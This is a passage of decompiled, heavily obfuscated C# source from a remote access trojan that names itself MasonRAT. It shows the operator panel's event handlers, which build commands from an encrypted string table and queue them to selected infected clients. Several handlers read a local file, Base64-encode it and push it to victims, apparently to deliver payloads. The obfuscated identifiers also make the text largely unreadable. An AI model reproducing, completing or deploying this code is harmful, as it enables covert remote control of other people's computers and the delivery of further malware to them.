    string str1 = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1820), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1821), DefaultResponse1, (514077259 - 588949295 % 1743355825 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (2127512123 + ~2052640087 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1, ((1206945107 ^ 20) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > 1330677566 + ~1303772857 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ? (52840618 > 522487282 ? -1 : -1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 : 1132956160 - 1132956161 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0);
    string DefaultResponse2 = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1822);
    string str2 = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1823), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1824), DefaultResponse2, (430060994 > 384815383 ? 1294208464 : 1725611285) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - ((2099514833 ^ 1427406547 << 389744924) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) % (-1746822008 - 671136551 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), (815341570 ^ 954025237 >> 1035287805) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + -((1197886951 ^ (854928867 | 2003526819)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1);
    if (!(str1.Length == 0 | str2.Length == 0))
    {
      string[] strArray = new string[((445627812 ^ ~445627583) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((-1083398968 - (608692233 | 1387557760) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) >> 388130446 - -251571496 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1825);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(192941907 - (2056115053 >> 960669107) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (1739261165 - 1022580637 % 85819078 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 << ((714643218 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = str2;
      strArray[(2018865541 | 1084053147) - 1320680019 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - ((636024768 | 1511864399) - 1440252550 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((268160747 ^ (108052517 | 164335301)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ -659137503 - -659137513 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = str1;
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cىـؤـ\u060Cۚـــڇڦبـژـۙـ\u060Cټ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cۜڇىئۙ\u060D\u0609ڞ\u060Bۏۧ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1826));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cۧﻋ\u060A\u060Dۛــڞ؁ـ\u060F\u0609ـ̍̍(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1827));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cــ\u0609ـۏڦـ\u060Dـ\u060D\u0608\u060Aڜ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1828));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـڙڟ؁\u0608ټــڙ\u060Bــ\u060Dٺ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1829));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0609\u060E\u0609ـ\u060Cٺۙ\u060Eـﻋـ\u060Bڝب(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1830));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـ̍دټٺـــ̍ـــ\u0608(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1831));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609\u0608ــ\u0609ـ\u060Bּۙـ\u0608ـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1832));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڙــــ\u060Dءּۡۛ\u060Eﻼٽـ\u060Aـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1833) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1834))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0609ڕ؁ئڝ؁\u060Aـٺــ\u0609\u060Eۭ̍ۏْ\u0608(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1835) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1836))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ڙڙـۚ\u060Dـڜ\u060Aﻻڝبـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1837) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1838))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Eۡگــــۚڙــڙددڙ\u0609ـ\u060D\u060E\u060B(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1839) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1840))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
